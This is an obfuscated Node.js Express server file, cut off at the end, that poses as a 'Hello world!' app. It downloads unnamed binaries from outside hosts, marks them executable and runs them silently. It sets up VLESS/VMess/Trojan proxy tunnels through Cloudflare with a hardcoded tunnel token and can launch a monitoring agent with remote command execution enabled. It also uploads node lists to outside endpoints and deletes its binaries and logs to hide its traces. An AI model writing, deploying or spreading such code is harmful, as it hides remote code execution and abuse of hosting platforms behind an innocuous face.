const _0x4447c0=_0x1e31;(function(_0x4b3155,_0xb0d690){const _0x35ca2f=_0x1e31,_0x183012=_0x4b3155();while(!![]){try{const _0x39b73f=parseInt(_0x35ca2f(0x221))/0x1*(parseInt(_0x35ca2f(0x280))/0x2)+parseInt(_0x35ca2f(0x259))/0x3*(parseInt(_0x35ca2f(0x1f2))/0x4)+parseInt(_0x35ca2f(0x252))/0x5*(parseInt(_0x35ca2f(0x233))/0x6)+parseInt(_0x35ca2f(0x229))/0x7+parseInt(_0x35ca2f(0x1ca))/0x8*(-parseInt(_0x35ca2f(0x1ff))/0x9)+parseInt(_0x35ca2f(0x246))/0xa+-parseInt(_0x35ca2f(0x264))/0xb;if(_0x39b73f===_0xb0d690)break;else _0x183012['push'](_0x183012['shift']());}catch(_0x330dfb){_0x183012['push'](_0x183012['shift']());}}}(_0x26fe,0xdeec0));const express=require(_0x4447c0(0x262)),app=express(),axios=require(_0x4447c0(0x209)),os=require('os'),fs=require('fs'),path=require(_0x4447c0(0x287)),{promisify}=require(_0x4447c0(0x1fb)),exec=promisify(require('child_process')[_0x4447c0(0x25e)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x4447c0(0x256)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x4447c0(0x256)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x4447c0(0x256)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x4447c0(0x256)]['FILE_PATH']||_0x4447c0(0x1cc),SUB_PATH=process[_0x4447c0(0x256)][_0x4447c0(0x1fd)]||_0x4447c0(0x1e4),PORT=process[_0x4447c0(0x256)][_0x4447c0(0x1e5)]||process[_0x4447c0(0x256)][_0x4447c0(0x24a)]||0xbb8,UUID=process[_0x4447c0(0x256)][_0x4447c0(0x276)]||_0x4447c0(0x1c6),NEZHA_SERVER=process[_0x4447c0(0x256)][_0x4447c0(0x282)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x4447c0(0x1be)]||'',ARGO_DOMAIN=process[_0x4447c0(0x256)]['ARGO_DOMAIN']||_0x4447c0(0x288),ARGO_AUTH=process[_0x4447c0(0x256)][_0x4447c0(0x286)]||_0x4447c0(0x1cf),ARGO_PORT=process[_0x4447c0(0x256)][_0x4447c0(0x279)]||0x1f5c,CFIP=process[_0x4447c0(0x256)][_0x4447c0(0x1f4)]||_0x4447c0(0x24d),CFPORT=process[_0x4447c0(0x256)][_0x4447c0(0x26e)]||0x1bb,NAME=process[_0x4447c0(0x256)][_0x4447c0(0x1c1)]||_0x4447c0(0x1e0);!fs[_0x4447c0(0x255)](FILE_PATH)?(fs[_0x4447c0(0x269)](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console[_0x4447c0(0x274)](FILE_PATH+_0x4447c0(0x213));function generateRandomName(){const _0x28045b=_0x4447c0,_0x2a887d=_0x28045b(0x217);let _0x39369d='';for(let _0x129f1f=0x0;_0x129f1f<0x6;_0x129f1f++){_0x39369d+=_0x2a887d['charAt'](Math[_0x28045b(0x27f)](Math['random']()*_0x2a887d[_0x28045b(0x20c)]));}return _0x39369d;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x4447c0(0x27e)](FILE_PATH,phpName),webPath=path[_0x4447c0(0x27e)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path[_0x4447c0(0x27e)](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,_0x4447c0(0x278)),bootLogPath=path['join'](FILE_PATH,_0x4447c0(0x21a)),configPath=path[_0x4447c0(0x27e)](FILE_PATH,'config.json');function deleteNodes(){const _0x3ec5e7=_0x4447c0;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0xfd41bd;try{_0xfd41bd=fs[_0x3ec5e7(0x267)](subPath,_0x3ec5e7(0x223));}catch{return null;}const _0x33a521=Buffer[_0x3ec5e7(0x20a)](_0xfd41bd,_0x3ec5e7(0x241))[_0x3ec5e7(0x250)](_0x3ec5e7(0x223)),_0x4037a0=_0x33a521['split']('\x0a')[_0x3ec5e7(0x212)](_0x415136=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x415136));if(_0x4037a0[_0x3ec5e7(0x20c)]===0x0)return;return axios[_0x3ec5e7(0x211)](UPLOAD_URL+_0x3ec5e7(0x21f),JSON['stringify']({'nodes':_0x4037a0}),{'headers':{'Content-Type':_0x3ec5e7(0x28a)}})[_0x3ec5e7(0x1c8)](_0x9dc65d=>{return null;}),null;}catch(_0x10f545){return null;}}function cleanupOldFiles(){const _0x7b04d2=_0x4447c0;try{const _0x5abe4d=fs[_0x7b04d2(0x265)](FILE_PATH);_0x5abe4d[_0x7b04d2(0x231)](_0x4676b5=>{const _0x4e380c=_0x7b04d2,_0x558a3a=path[_0x4e380c(0x27e)](FILE_PATH,_0x4676b5);try{const _0x2d7b1c=fs[_0x4e380c(0x232)](_0x558a3a);_0x2d7b1c[_0x4e380c(0x23c)]()&&fs['unlinkSync'](_0x558a3a);}catch(_0xa753a3){}});}catch(_0x433146){}}app[_0x4447c0(0x1cb)]('/',function(_0x1c772b,_0x3efb1e){const _0x4ffe29=_0x4447c0;_0x3efb1e[_0x4ffe29(0x1d2)](_0x4ffe29(0x227));});function _0x26fe(){const _0x29aee1=['success','message','aarch64','express','\x20-s\x20','21321586OjzayP','readdirSync','/api/add-subscriptions','readFileSync','Error\x20in\x20startserver:','mkdirSync','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','127.0.0.1','2096','https+local://8.8.8.8/dns-query','CFPORT','includes','status','close','?encryption=none&security=tls&sni=','platform','log','tcp','UUID','\x20>/dev/null\x202>&1','list.txt','ARGO_PORT','push','all','/vmess-argo?ed=2560','amd','join','floor','22yQREFm','Skipping\x20adding\x20automatic\x20access\x20task','NEZHA_SERVER','block','then','/config.json\x20>/dev/null\x202>&1\x20&','ARGO_AUTH','path','hk.858.de5.net','https://arm64.ssss.nyc.mn/bot','application/json','NEZHA_KEY','config.json','error','NAME','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','vless','9afd1229-b893-30v6-95df-51e7ce204913','chmod','catch','\x22\x20>\x20/dev/null\x202>&1','7032xIAfrw','get','./tmp','\x0a\x20\x20tunnel:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','eyJhIjoiMTczYTQ3YzQ2YTY5NWM1MTcwOWU5YTBlNDZhNTk4MzIiLCJ0IjoiMTNkOGU0MDgtZWY0Yy00ZTIwLWIwY2ItYmViZTJlNDgyMGZhIiwicyI6IlltWTBNV05tTURNdE9EWXlNQzAwTmpFMExUa3lNRGd0TVRZek5ESTFaV1ZqTlRRNSJ9','unshift','https://amd64.ssss.nyc.mn/agent','send','Error\x20reading\x20boot.log:','config.yaml','.exe\x20>\x20nul\x202>&1','vmess','tunnel.yml','https://arm64.ssss.nyc.mn/v1','direct','npm\x20running\x20error:\x20','has','trojan','charAt','country_code','Unknown','lesflow-hk','xtls-rprx-vision','data','arm','sub','SERVER_PORT','quic','tls','http://ip-api.com/json/','web\x20running\x20error:\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','/vmess-argo','org','pkill\x20-f\x20\x22[','stringify','\x0a\x0avmess://','Unhandled\x20error\x20in\x20startserver:','&fp=firefox&type=ws&host=','87436lASUiI','\x20failed:\x20','CFIP','text/plain;\x20charset=utf-8','Error\x20executing\x20command:\x20','&path=%2Fvless-argo%3Fed%3D2560#','--tls','none','http','util','unlinkSync','SUB_PATH','match','14301exzamA','\x0a\x20\x20\x20\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','listen','https://amd64.ssss.nyc.mn/v1','\x0avless://','response','https://arm64.ssss.nyc.mn/web','substring','basename','axios','from','tunnel.json','length','stream','Subscription\x20uploaded\x20successfully','Error\x20downloading\x20files:','\x20-p\x20','post','filter','\x20already\x20exists','https://ipapi.co/json/','App\x20is\x20running','\x20>/dev/null\x202>&1\x20&','abcdefghijklmnopqrstuvwxyz','\x20is\x20running','finish','boot.log','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','clear','taskkill\x20/f\x20/im\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','/api/delete-nodes','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','96651yAcaDT','https://amd64.ssss.nyc.mn/web','utf-8','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','/dev/null','fileUrl','Hello\x20world!','\x20-c\x20\x22','4060406ZZKrPU','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','https://arm64.ssss.nyc.mn/agent','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x20-c\x20','/tunnel.yml\x20run','2083','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','forEach','statSync','8768652FrhCYq','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','Download\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','win32','freedom','writeFileSync','Empowerment\x20failed\x20for\x20','http\x20server\x20is\x20running\x20on\x20port:','isFile','443','rm\x20-rf\x20','split','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','base64','\x0a\x0atrojan://','createWriteStream','countryCode','ArgoDomain:','5751500zZxcrg','https://amd64.ssss.nyc.mn/bot','/trojan-argo','true','PORT','https://oooo.serv00.net/add-url','false','saas.sin.fan','nohup\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','toString','blackhole','5ILGvcG','/vless-argo','\x20>\x20nul\x202>&1','existsSync','env','fileName','Nodes\x20uploaded\x20successfully','78INWLpt','pipe','test','TunnelSecret','?security=tls&sni=','exec'];_0x26fe=function(){return _0x29aee1;};return _0x26fe();}async function generateConfig(){const _0x221e6c=_0x4447c0,_0x1bf859={'log':{'access':_0x221e6c(0x225),'error':'/dev/null','loglevel':_0x221e6c(0x1f9)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x221e6c(0x1e1)}],'decryption':_0x221e6c(0x1f9),'fallbacks':[{'dest':0xbb9},{'path':_0x221e6c(0x253),'dest':0xbba},{'path':_0x221e6c(0x1eb),'dest':0xbbb},{'path':_0x221e6c(0x248),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x221e6c(0x26b),'protocol':_0x221e6c(0x1c5),'settings':{'clients':[{'id':UUID}],'decryption':_0x221e6c(0x1f9)},'streamSettings':{'network':_0x221e6c(0x275),'security':_0x221e6c(0x1f9)}},{'port':0xbba,'listen':_0x221e6c(0x26b),'protocol':_0x221e6c(0x1c5),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x221e6c(0x1f9)},'streamSettings':{'network':'ws','security':_0x221e6c(0x1f9),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x221e6c(0x1fa),_0x221e6c(0x1e7),_0x221e6c(0x1e6)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x221e6c(0x1d6),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x221e6c(0x1eb)}},'sniffing':{'enabled':!![],'destOverride':[_0x221e6c(0x1fa),_0x221e6c(0x1e7),_0x221e6c(0x1e6)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x221e6c(0x1dc),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x221e6c(0x1f9),'wsSettings':{'path':_0x221e6c(0x248)}},'sniffing':{'enabled':!![],'destOverride':[_0x221e6c(0x1fa),_0x221e6c(0x1e7),_0x221e6c(0x1e6)],'metadataOnly':![]}}],'dns':{'servers':[_0x221e6c(0x26d)]},'outbounds':[{'protocol':_0x221e6c(0x238),'tag':_0x221e6c(0x1d9)},{'protocol':_0x221e6c(0x251),'tag':_0x221e6c(0x283)}]};fs[_0x221e6c(0x239)](path[_0x221e6c(0x27e)](FILE_PATH,_0x221e6c(0x1bf)),JSON['stringify'](_0x1bf859,null,0x2));}function getSystemArchitecture(){const _0x42eac3=_0x4447c0,_0x7096bf=os['arch']();return _0x7096bf===_0x42eac3(0x1e3)||_0x7096bf==='arm64'||_0x7096bf===_0x42eac3(0x261)?_0x42eac3(0x1e3):_0x42eac3(0x27d);}function downloadFile(_0x42d409,_0x3abe5d,_0x2bf564){const _0x2d358c=_0x4447c0,_0x177184=_0x42d409;!fs[_0x2d358c(0x255)](FILE_PATH)&&fs[_0x2d358c(0x269)](FILE_PATH,{'recursive':!![]});const _0x543769=fs[_0x2d358c(0x243)](_0x177184);axios({'method':_0x2d358c(0x1cb),'url':_0x3abe5d,'responseType':_0x2d358c(0x20d)})[_0x2d358c(0x284)](_0x9812fd=>{const _0x232177=_0x2d358c;_0x9812fd[_0x232177(0x1e2)][_0x232177(0x25a)](_0x543769),_0x543769['on'](_0x232177(0x219),()=>{const _0x11f574=_0x232177;_0x543769[_0x11f574(0x271)](),console[_0x11f574(0x274)](_0x11f574(0x235)+path[_0x11f574(0x208)](_0x177184)+'\x20successfully'),_0x2bf564(null,_0x177184);}),_0x543769['on'](_0x232177(0x1c0),_0x1e9b42=>{const _0x12bd84=_0x232177;fs['unlink'](_0x177184,()=>{});const _0x44f6c2=_0x12bd84(0x235)+path['basename'](_0x177184)+'\x20failed:\x20'+_0x1e9b42['message'];console[_0x12bd84(0x1c0)](_0x44f6c2),_0x2bf564(_0x44f6c2);});})[_0x2d358c(0x1c8)](_0x1b59bd=>{const _0x6afbdc=_0x2d358c,_0xf7835=_0x6afbdc(0x235)+path['basename'](_0x177184)+_0x6afbdc(0x1f3)+_0x1b59bd[_0x6afbdc(0x260)];console[_0x6afbdc(0x1c0)](_0xf7835),_0x2bf564(_0xf7835);});}async function downloadFilesAndRun(){const _0x31e42d=_0x4447c0,_0x45fc00=getSystemArchitecture(),_0x51703c=getFilesForArchitecture(_0x45fc00);if(_0x51703c[_0x31e42d(0x20c)]===0x0){console['log'](_0x31e42d(0x26a));return;}const _0x4e84b0=_0x51703c['map'](_0x5d567b=>{return new Promise((_0x5be809,_0x45506b)=>{const _0xe39400=_0x1e31;downloadFile(_0x5d567b[_0xe39400(0x257)],_0x5d567b[_0xe39400(0x226)],(_0x44de29,_0x3a25f3)=>{_0x44de29?_0x45506b(_0x44de29):_0x5be809(_0x3a25f3);});});});try{await Promise[_0x31e42d(0x27b)](_0x4e84b0);}catch(_0x15f1f8){console[_0x31e42d(0x1c0)](_0x31e42d(0x20f),_0x15f1f8);return;}function _0x251755(_0x4d974f){const _0x2747aa=0x1fd;_0x4d974f['forEach'](_0x56bb57=>{const _0x2e3897=_0x1e31;fs['existsSync'](_0x56bb57)&&fs[_0x2e3897(0x1c7)](_0x56bb57,_0x2747aa,_0x395d6b=>{const _0x3ccec4=_0x2e3897;_0x395d6b?console[_0x3ccec4(0x1c0)](_0x3ccec4(0x23a)+_0x56bb57+':\x20'+_0x395d6b):console['log']('Empowerment\x20success\x20for\x20'+_0x56bb57+':\x20'+_0x2747aa['toString'](0x8));});});}const _0x4f1efe=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x251755(_0x4f1efe);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x48a845=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x31e42d(0x23f)](':')['pop']():'',_0x259529=new Set([_0x31e42d(0x23d),'8443','2096','2087',_0x31e42d(0x22f),'2053']),_0x1d935d=_0x259529[_0x31e42d(0x1db)](_0x48a845)?_0x31e42d(0x249):_0x31e42d(0x24c),_0x453474='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x31e42d(0x1c3)+_0x1d935d+_0x31e42d(0x230)+UUID;fs[_0x31e42d(0x239)](path[_0x31e42d(0x27e)](FILE_PATH,_0x31e42d(0x1d4)),_0x453474);const _0xee67fd='nohup\x20'+phpPath+_0x31e42d(0x228)+FILE_PATH+_0x31e42d(0x1ce);try{await exec(_0xee67fd),console[_0x31e42d(0x274)](phpName+_0x31e42d(0x218)),await new Promise(_0x53c9e4=>setTimeout(_0x53c9e4,0x3e8));}catch(_0x103913){console[_0x31e42d(0x1c0)]('php\x20running\x20error:\x20'+_0x103913);}}else{let _0x3cdea7='';const _0x4b9054=[_0x31e42d(0x23d),'8443',_0x31e42d(0x26c),'2087',_0x31e42d(0x22f),'2053'];_0x4b9054[_0x31e42d(0x26f)](NEZHA_PORT)&&(_0x3cdea7=_0x31e42d(0x1f8));const _0x58d5ee=_0x31e42d(0x24e)+npmPath+_0x31e42d(0x263)+NEZHA_SERVER+':'+NEZHA_PORT+_0x31e42d(0x210)+NEZHA_KEY+'\x20'+_0x3cdea7+_0x31e42d(0x1c2);try{await exec(_0x58d5ee),console[_0x31e42d(0x274)](npmName+_0x31e42d(0x218)),await new Promise(_0x4ef41b=>setTimeout(_0x4ef41b,0x3e8));}catch(_0x4d01f5){console[_0x31e42d(0x1c0)](_0x31e42d(0x1da)+_0x4d01f5);}}}else console[_0x31e42d(0x274)](_0x31e42d(0x236));const _0x39a285='nohup\x20'+webPath+_0x31e42d(0x22d)+FILE_PATH+_0x31e42d(0x285);try{await exec(_0x39a285),console['log'](webName+'\x20is\x20running'),await new Promise(_0x47b9ca=>setTimeout(_0x47b9ca,0x3e8));}catch(_0x23a10e){console[_0x31e42d(0x1c0)](_0x31e42d(0x1e9)+_0x23a10e);}if(fs['existsSync'](botPath)){let _0x4cc582;if(ARGO_AUTH[_0x31e42d(0x1fe)](/^[A-Z0-9a-z=]{120,250}$/))_0x4cc582=_0x31e42d(0x22c)+ARGO_AUTH;else ARGO_AUTH[_0x31e42d(0x1fe)](/TunnelSecret/)?_0x4cc582=_0x31e42d(0x240)+FILE_PATH+_0x31e42d(0x22e):_0x4cc582=_0x31e42d(0x234)+FILE_PATH+_0x31e42d(0x224)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x4cc582+'\x20>/dev/null\x202>&1\x20&'),console[_0x31e42d(0x274)](botName+'\x20is\x20running'),await new Promise(_0xd1b6b=>setTimeout(_0xd1b6b,0x7d0));}catch(_0x5b80b6){console[_0x31e42d(0x1c0)](_0x31e42d(0x1f6)+_0x5b80b6);}}await new Promise(_0x313aef=>setTimeout(_0x313aef,0x1388));}function getFilesForArchitecture(_0x3853de){const _0x3f893b=_0x4447c0;let _0x4c3ddd;_0x3853de==='arm'?_0x4c3ddd=[{'fileName':webPath,'fileUrl':_0x3f893b(0x206)},{'fileName':botPath,'fileUrl':_0x3f893b(0x289)}]:_0x4c3ddd=[{'fileName':webPath,'fileUrl':_0x3f893b(0x222)},{'fileName':botPath,'fileUrl':_0x3f893b(0x247)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x37c69d=_0x3853de===_0x3f893b(0x1e3)?_0x3f893b(0x22b):_0x3f893b(0x1d1);_0x4c3ddd[_0x3f893b(0x1d0)]({'fileName':npmPath,'fileUrl':_0x37c69d});}else{const _0x34f16b=_0x3853de===_0x3f893b(0x1e3)?_0x3f893b(0x1d8):_0x3f893b(0x203);_0x4c3ddd['unshift']({'fileName':phpPath,'fileUrl':_0x34f16b});}}return _0x4c3ddd;}function argoType(){const _0x16acee=_0x4447c0;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x16acee(0x274)](_0x16acee(0x21b));return;}if(ARGO_AUTH[_0x16acee(0x26f)](_0x16acee(0x25c))){fs['writeFileSync'](path['join'](FILE_PATH,_0x16acee(0x20b)),ARGO_AUTH);const _0x1e4206=_0x16acee(0x1cd)+ARGO_AUTH[_0x16acee(0x23f)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x16acee(0x27e)](FILE_PATH,_0x16acee(0x20b))+_0x16acee(0x1c4)+ARGO_DOMAIN+_0x16acee(0x22a)+ARGO_PORT+_0x16acee(0x21e);fs[_0x16acee(0x239)](path[_0x16acee(0x27e)](FILE_PATH,_0x16acee(0x1d7)),_0x1e4206);}else console[_0x16acee(0x274)](_0x16acee(0x201));}async function extractDomains(){const _0x2e3514=_0x4447c0;let _0x1dbcc2;if(ARGO_AUTH&&ARGO_DOMAIN)_0x1dbcc2=ARGO_DOMAIN,console[_0x2e3514(0x274)]('ARGO_DOMAIN:',_0x1dbcc2),await _0x4d325d(_0x1dbcc2);else try{const _0x447a12=fs[_0x2e3514(0x267)](path[_0x2e3514(0x27e)](FILE_PATH,'boot.log'),_0x2e3514(0x223)),_0x298364=_0x447a12['split']('\x0a'),_0x4887cf=[];_0x298364[_0x2e3514(0x231)](_0x1a3498=>{const _0x1a521e=_0x2e3514,_0x5dc0e1=_0x1a3498[_0x1a521e(0x1fe)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5dc0e1){const _0xa891f3=_0x5dc0e1[0x1];_0x4887cf[_0x1a521e(0x27a)](_0xa891f3);}});if(_0x4887cf['length']>0x0)_0x1dbcc2=_0x4887cf[0x0],console[_0x2e3514(0x274)](_0x2e3514(0x245),_0x1dbcc2),await _0x4d325d(_0x1dbcc2);else{console[_0x2e3514(0x274)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x2e3514(0x1fc)](path[_0x2e3514(0x27e)](FILE_PATH,'boot.log'));async function _0xf5b706(){const _0x4ffe67=_0x2e3514;try{process[_0x4ffe67(0x273)]===_0x4ffe67(0x237)?await exec(_0x4ffe67(0x21d)+botName+_0x4ffe67(0x1d5)):await exec(_0x4ffe67(0x1ed)+botName[_0x4ffe67(0x1dd)](0x0)+']'+botName[_0x4ffe67(0x207)](0x1)+_0x4ffe67(0x1c9));}catch(_0x1ccf62){}}_0xf5b706(),await new Promise(_0x167615=>setTimeout(_0x167615,0xbb8));const _0x58e63b=_0x2e3514(0x234)+FILE_PATH+_0x2e3514(0x224)+ARGO_PORT;try{await exec(_0x2e3514(0x24e)+botPath+'\x20'+_0x58e63b+_0x2e3514(0x216)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x4a62b3=>setTimeout(_0x4a62b3,0xbb8)),await extractDomains();}catch(_0x312066){console['error'](_0x2e3514(0x1f6)+_0x312066);}}}catch(_0x3fd04e){console[_0x2e3514(0x1c0)](_0x2e3514(0x1d3),_0x3fd04e);}async function _0x3fca39(){const _0x5f0d0b=_0x2e3514;try{const _0x31b131=await axios[_0x5f0d0b(0x1cb)](_0x5f0d0b(0x214),{'timeout':0xbb8});if(_0x31b131['data']&&_0x31b131[_0x5f0d0b(0x1e2)][_0x5f0d0b(0x1de)]&&_0x31b131[_0x5f0d0b(0x1e2)][_0x5f0d0b(0x1ec)])return _0x31b131['data'][_0x5f0d0b(0x1de)]+'_'+_0x31b131['data']['org'];}catch(_0x425e7){try{const _0x313aeb=await axios[_0x5f0d0b(0x1cb)](_0x5f0d0b(0x1e8),{'timeout':0xbb8});if(_0x313aeb['data']&&_0x313aeb[_0x5f0d0b(0x1e2)][_0x5f0d0b(0x270)]===_0x5f0d0b(0x25f)&&_0x313aeb[_0x5f0d0b(0x1e2)][_0x5f0d0b(0x244)]&&_0x313aeb[_0x5f0d0b(0x1e2)]['org'])return _0x313aeb[_0x5f0d0b(0x1e2)][_0x5f0d0b(0x244)]+'_'+_0x313aeb[_0x5f0d0b(0x1e2)]['org'];}catch(_0x4f9b0f){}}return _0x5f0d0b(0x1df);}async function _0x4d325d(_0x1ff535){const _0x29e89b=await _0x3fca39(),_0x396f69=NAME?NAME+'-'+_0x29e89b:_0x29e89b;return new Promise(_0x2263da=>{setTimeout(()=>{const _0x16a79f=_0x1e31,_0x21ed94={'v':'2','ps':''+_0x396f69,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x16a79f(0x1f9),'net':'ws','type':'none','host':_0x1ff535,'path':_0x16a79f(0x27c),'tls':_0x16a79f(0x1e7),'sni':_0x1ff535,'alpn':'','fp':'firefox'},_0x1963a3=_0x16a79f(0x204)+UUID+'@'+CFIP+':'+CFPORT+_0x16a79f(0x272)+_0x1ff535+_0x16a79f(0x1f1)+_0x1ff535+_0x16a79f(0x1f7)+_0x396f69+_0x16a79f(0x1ef)+Buffer['from'](JSON['stringify'](_0x21ed94))[_0x16a79f(0x250)]('base64')+_0x16a79f(0x242)+UUID+'@'+CFIP+':'+CFPORT+_0x16a79f(0x25d)+_0x1ff535+_0x16a79f(0x1f1)+_0x1ff535+_0x16a79f(0x1ea)+_0x396f69+_0x16a79f(0x200);console[_0x16a79f(0x274)](Buffer[_0x16a79f(0x20a)](_0x1963a3)[_0x16a79f(0x250)]('base64')),fs['writeFileSync'](subPath,Buffer['from'](_0x1963a3)['toString'](_0x16a79f(0x241))),console[_0x16a79f(0x274)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app['get']('/'+SUB_PATH,(_0x196f01,_0x4c4215)=>{const _0x4f7599=_0x16a79f,_0x96b482=Buffer[_0x4f7599(0x20a)](_0x1963a3)[_0x4f7599(0x250)](_0x4f7599(0x241));_0x4c4215['set']('Content-Type',_0x4f7599(0x1f5)),_0x4c4215[_0x4f7599(0x1d2)](_0x96b482);}),_0x2263da(_0x1963a3);},0x7d0);});}}async function uploadNodes(){const _0x6ccaae=_0x4447c0;if(UPLOAD_URL&&PROJECT_URL){const _0x6ee82b=PROJECT_URL+'/'+SUB_PATH,_0x4fe615={'subscription':[_0x6ee82b]};try{const _0x2deade=await axios['post'](UPLOAD_URL+_0x6ccaae(0x266),_0x4fe615,{'headers':{'Content-Type':_0x6ccaae(0x28a)}});return _0x2deade&&_0x2deade[_0x6ccaae(0x270)]===0xc8?(console[_0x6ccaae(0x274)](_0x6ccaae(0x20e)),_0x2deade):null;}catch(_0x5a6e15){if(_0x5a6e15[_0x6ccaae(0x205)]){if(_0x5a6e15['response'][_0x6ccaae(0x270)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x6ccaae(0x255)](listPath))return;const _0x143978=fs['readFileSync'](listPath,_0x6ccaae(0x223)),_0x5b9f04=_0x143978[_0x6ccaae(0x23f)]('\x0a')[_0x6ccaae(0x212)](_0x4bd0ca=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x6ccaae(0x25b)](_0x4bd0ca));if(_0x5b9f04[_0x6ccaae(0x20c)]===0x0)return;const _0xb1f66=JSON[_0x6ccaae(0x1ee)]({'nodes':_0x5b9f04});try{const _0x13b1a7=await axios[_0x6ccaae(0x211)](UPLOAD_URL+'/api/add-nodes',_0xb1f66,{'headers':{'Content-Type':_0x6ccaae(0x28a)}});return _0x13b1a7&&_0x13b1a7['status']===0xc8?(console[_0x6ccaae(0x274)](_0x6ccaae(0x258)),_0x13b1a7):null;}catch(_0x1d8b9d){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x46f79c=_0x1e31,_0x2833e4=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2833e4['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2833e4[_0x46f79c(0x27a)](phpPath);process[_0x46f79c(0x273)]===_0x46f79c(0x237)?exec('del\x20/f\x20/q\x20'+_0x2833e4[_0x46f79c(0x27e)]('\x20')+_0x46f79c(0x254),_0x5291fd=>{const _0x270d4a=_0x46f79c;console[_0x270d4a(0x21c)](),console[_0x270d4a(0x274)]('App\x20is\x20running'),console[_0x270d4a(0x274)](_0x270d4a(0x220));}):exec(_0x46f79c(0x23e)+_0x2833e4[_0x46f79c(0x27e)]('\x20')+_0x46f79c(0x277),_0x559d1a=>{const _0x44c99f=_0x46f79c;console['clear'](),console['log'](_0x44c99f(0x215)),console['log'](_0x44c99f(0x220));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x66d3b3=_0x4447c0;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x66d3b3(0x274)](_0x66d3b3(0x281));return;}try{const _0x20ca0b=await axios[_0x66d3b3(0x211)](_0x66d3b3(0x24b),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x66d3b3(0x28a)}});return console[_0x66d3b3(0x274)]('automatic\x20access\x20task\x20added\x20successfully'),_0x20ca0b;}catch(_0x906a0d){return console[_0x66d3b3(0x1c0)](_0x66d3b3(0x24f)+_0x906a0d[_0x66d3b3(0x260)]),null;}}async function startserver(){const _0x3e0dca=_0x4447c0;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x31aefd){console[_0x3e0dca(0x1c0)](_0x3e0dca(0x268),_0x31aefd);}}function 